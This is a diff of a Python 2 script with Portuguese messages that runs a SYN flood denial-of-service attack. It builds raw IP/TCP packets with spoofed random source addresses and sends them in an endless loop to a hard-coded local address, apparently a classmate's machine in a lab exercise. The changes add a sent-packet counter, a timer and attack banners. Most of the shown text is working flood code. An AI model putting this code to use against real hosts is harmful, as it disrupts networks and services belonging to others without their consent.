@@ -6,7 +6,7 @@
 import socket, sys, random
 from struct import *
 from threading import Thread
-
+import time 
 
  
 # checksum functions needed for calculation checksum
@@ -25,15 +25,19 @@ def checksum(msg):
     return s
 
 def show_begin():
-    print ':X :X :X :X Incio do ataque ! :X :X :X :X '
+    import time
+    print 'Inciando o ataque...\n\n'
+    time.sleep(4) 
 
 def show_who(ip,porta):
-    print '-------------------------------------------------------------------'
-    print ' O servidor esta sendo atacado pelo IP: ',ip,'na Porta:',porta,
-    print '\n-------------------------------------------------------------------\n'
+    print '----------------------------------------------------'
+    print ' O servidor ',ip,'esta sendo na Porta:',porta,
+    print '\n----------------------------------------------------\n'
 
 def attack(porta): 
     #create a raw socket
+    import time
+
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
     except socket.error , msg:
@@ -54,7 +58,7 @@ def attack(porta):
     #source_ip = '192.168.0.17'
     #dest_ip = '192.168.0.101' # victor
     dest_ip = '192.168.0.1' # gabriel
-
+    show_who(dest_ip,porta)
     # ip header fields
     ihl = 5
     version = 4
@@ -94,8 +98,8 @@ def attack(porta):
     protocol = socket.IPPROTO_TCP
      
     #Send the packet finally - the port specified has no effect
-    print 'O servidor',dest_ip,'esta sendo atacado'
-     
+    #print 'O servidor',dest_ip,'esta sendo atacado'
+    contador=0
     #put the above line in a loop like while 1: if you want to flood
     while True:
         #parte de gerar o pacote IP, para cada novo endereco de origem de IP gerado
@@ -115,6 +119,9 @@ def attack(porta):
         source_address = socket.inet_aton( source_ip )
         tcp_length = len(tcp_header)
 
+        if contador > 50000:
+            print 'Foram enviados ',contador,' mensagens de SYN'
+            contador=0
         psh = pack('!4s4sBBH' , source_address , dest_address , placeholder , protocol , tcp_length);
         psh = psh + tcp_header;
          
@@ -127,20 +134,20 @@ def attack(porta):
         packet = ip_header + tcp_header
 
         s.sendto(packet, (dest_ip , 0 ))    # put this in a loop if you want to flood the target
+        contador= contador + 1
 
     
 
-# def count_time(max):
-#     import time
-#     begin = time.time()
-#     duration = 0
-
-#     while True:
-#         time_until_now = time.time()
-#         duration = time_until_now - begin
-#         if duration > max:
-#         	print 'entrou aqui', duration
-#         	begin = time.time()
+def count_time(max):
+    import time
+    begin = time.time()
+    duration = 0
+    while True:
+        time_until_now = time.time()
+        duration = time_until_now - begin
+        if duration > max:
+            print '\n\nSe passaram ',duration,' segundos\n\n'
+            begin = time.time()
         	
 
 
